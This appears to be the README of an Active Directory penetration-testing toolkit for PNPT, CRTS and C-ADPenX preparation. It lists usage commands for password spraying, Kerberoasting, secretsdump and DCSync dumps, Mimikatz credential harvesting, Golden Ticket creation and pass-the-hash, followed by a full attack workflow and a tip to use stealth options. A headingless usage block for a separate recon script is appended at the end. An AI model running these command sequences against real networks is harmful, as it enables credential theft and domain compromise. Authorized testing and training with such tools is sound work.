# AD Pentest Toolkit

A comprehensive toolkit for automating Active Directory penetration testing tasks. This toolkit was developed to assist in preparing for the following certifications:
- Practical Network Penetration Tester (PNPT) from TCM Security  
- Certified Red Team Specialist (CRTS) from CyberWarfare Labs
- Certified Active Directory Pentesting eXpert (C-ADPenX) from SecOps Group

## Overview

This toolkit contains a collection of Python scripts designed to streamline and automate various aspects of Active Directory penetration testing. Each script focuses on a specific area of the penetration testing process, allowing for modular usage and integration into a comprehensive workflow.

## Prerequisites

Before using these tools, ensure you have the following:

1. Python 3.6+ installed
2. Required Python modules:
   - pathlib
   - datetime
   - json
   - base64
   - re
   - subprocess
   - argparse

3. Required external tools:
   - Netexec (formerly CrackMapExec)
   - Impacket suite
   - Mimikatz (for certain tools)
   - BloodHound
   - SharpView
   - Hashcat or John the Ripper

## Installation

1. Clone the repository:
```
git clone https://github.com/yourusername/ad-pentest-toolkit.git
cd ad-pentest-toolkit
```

2. Set up your environment:
```
python3 check-environment.py
```
This will check if you have all the necessary tools and create the required directories.

3. Configure the toolkit by editing `config.py`:
```
nano config.py
```
Update the targets, credentials, and other settings as needed.

## Tools Included

### 1. NetExec Enumerator

A wrapper for NetExec (formerly CrackMapExec) that automates enumeration of Active Directory environments.

**Usage:**
```
# Set configuration
./netexec-enumerator.py set username svc_admin
./netexec-enumerator.py set password Password123!
./netexec-enumerator.py set target 192.168.1.100

# Run enumeration
./netexec-enumerator.py enum smb,users,creds,spider,policy
```

### 2. Kerberoasting Automation

Automates the process of identifying and exploiting Kerberoastable accounts.

**Usage:**
```
# Target a specific host
./kerberoast.py -t 10.0.0.1

# Use default targets from config.py
./kerberoast.py
```

### 3. Impacket Toolkit

Wrapper for Impacket suite that streamlines execution of common AD attacks.

**Usage:**
```
# Dump SAM hashes
./impacket-toolkit.py secretsdump -t 192.168.1.100

# Check SMB access
./impacket-toolkit.py smbclient -t 192.168.1.100

# Run command execution
./impacket-toolkit.py psexec -t 192.168.1.100

# Check for ASREProasting
./impacket-toolkit.py asreproast -t 192.168.1.100

# DCSync attack
./impacket-toolkit.py dcsync -t 192.168.1.100

# Run all tools
./impacket-toolkit.py all -t 192.168.1.100
```

### 4. PowerShell Enumeration Framework

Comprehensive AD enumeration using PowerShell, including domain details, users, groups, computers, and more.

**Usage:**
```
# Local enumeration with network scanning
./powershell-enumeration.py local -n 192.168.1.0/24

# Remote enumeration of a target system
./powershell-enumeration.py remote -t 192.168.1.100 -u administrator -p Password123!

# Network discovery scan
./powershell-enumeration.py scan -n 192.168.1.0/24

# Full enumeration campaign
./powershell-enumeration.py full -t 192.168.1.100 192.168.1.101 -u administrator -p Password123!
```

### 5. SharpView Automator

Wrapper for SharpView that automates the collection of AD information and attack path discovery.

**Usage:**
```
# Full enumeration
./sharpview-automator.py full -t 192.168.1.100 -u administrator -p Password123!

# Domain info
./sharpview-automator.py domain -t 192.168.1.100 -u administrator -p Password123!

# User enumeration
./sharpview-automator.py users -t 192.168.1.100 -u administrator -p Password123!

# Admin users only
./sharpview-automator.py users -t 192.168.1.100 -u administrator -p Password123! -a

# Enumerate group members
./sharpview-automator.py group-members -g "Domain Admins" -t 192.168.1.100 -u administrator -p Password123!

# Find local admin access
./sharpview-automator.py admin-access -t 192.168.1.100 -u administrator -p Password123!
```

### 6. Mimikatz Wrapper

Interface for Mimikatz to automate credential harvesting and ticket manipulation.

**Usage:**
```
# Dump credentials from local system
./mimikatz-wrapper.py local all

# Create a Golden Ticket
./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Run credential harvesting on remote systems
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -p Password123!

# Execute command via Pass-the-Hash
./mimikatz-wrapper.py pth -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -c "whoami"
```

### 7. AD Pentest Toolkit (Main Script)

Orchestrates the execution of multiple tools in the toolkit, providing a centralized interface.

**Usage:**
```
# Check environment
./adpentest-toolkit.py check

# Run password spraying
./adpentest-toolkit.py spray -t 192.168.1.100

# Run NetExec enumeration
./adpentest-toolkit.py netexec -t 192.168.1.100 -s smb,users

# Run Kerberoasting
./adpentest-toolkit.py kerberoast -t 192.168.1.100

# Run BloodHound collection
./adpentest-toolkit.py bloodhound -t 192.168.1.100

# Run full scan with all tools
./adpentest-toolkit.py full -t 192.168.1.100
```

## Environment Check

Before beginning an assessment, use the environment check tool to verify your setup:

```
./check-environment.py
```

This will:
- Verify your Python installation
- Check if required tools are in your PATH
- Verify the configuration file
- Ensure required directories exist
- Check for required Python modules

## Results and Logs

All results are stored in the `results` directory, organized by tool:
- `results/kerberoast/` - Kerberoasting results
- `results/impacket/` - Impacket tool results
- `results/ad_enumeration/` - PowerShell enumeration results
- `results/mimikatz/` - Mimikatz credential harvesting results
- `results/sharpview/` - SharpView enumeration results

Logs are stored in the `logs` directory for troubleshooting.

## Comprehensive Workflow Example

Below is an example of a full AD penetration testing workflow using this toolkit:

1. Verify your environment:
```
./check-environment.py
```

2. Start with password spraying to obtain initial access:
```
./adpentest-toolkit.py spray
```

3. Once you have valid credentials, enumerate the domain:
```
./netexec-enumerator.py set username found_user
./netexec-enumerator.py set password found_password
./netexec-enumerator.py set target 192.168.1.100
./netexec-enumerator.py enum smb,users
```

4. Look for Kerberoastable accounts:
```
./kerberoast.py
```

5. Run PowerShell-based enumeration for comprehensive information:
```
./powershell-enumeration.py remote -t 192.168.1.100 -u found_user -p found_password
```

6. Use SharpView to identify potential attack paths:
```
./sharpview-automator.py full -t 192.168.1.100 -u found_user -p found_password
```

7. Dump credentials using Mimikatz:
```
./mimikatz-wrapper.py remote -t 192.168.1.100 -d domain.local -u found_user -p found_password
```

8. With additional credentials, perform lateral movement using Impacket:
```
./impacket-toolkit.py psexec -t 192.168.1.101
```

## Security Considerations

- Use this toolkit only in environments where you have explicit permission to perform security testing
- Store the toolkit on an encrypted drive when not in use
- Be aware that some tools (especially Mimikatz) may trigger antivirus alerts
- Use stealth options where available to minimize detection

## Contributing

Contributions to this toolkit are welcome! If you'd like to add a new feature or improve an existing one:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

- TCM Security for the PNPT certification
- CyberWarfare Labs for the CRTS certification
- SecOps Group for the C-ADPenX certification
- Creators of tools like Impacket, NetExec, Mimikatz, and SharpView


# Simple usage against a single target
python3 ad-autorecon.py -t 192.168.1.100

# Scan a subnet
python3 ad-autorecon.py -t 192.168.1.0/24

# Use a file with multiple targets
python3 ad-autorecon.py -tL targets.txt

# Quick scan with fewer checks
python3 ad-autorecon.py -t 192.168.1.100 -q

# Skip certain phases
python3 ad-autorecon.py -t 192.168.1.100 --skip-bloodhound --skip-powershell

# Multi-threaded scan with custom thread count
python3 ad-autorecon.py -tL targets.txt --threads 15

# Generate a report after scanning
python3 ad-autorecon.py -t 192.168.1.100 --report

# Only generate a report from previous scans
python3 ad-autorecon.py --report-only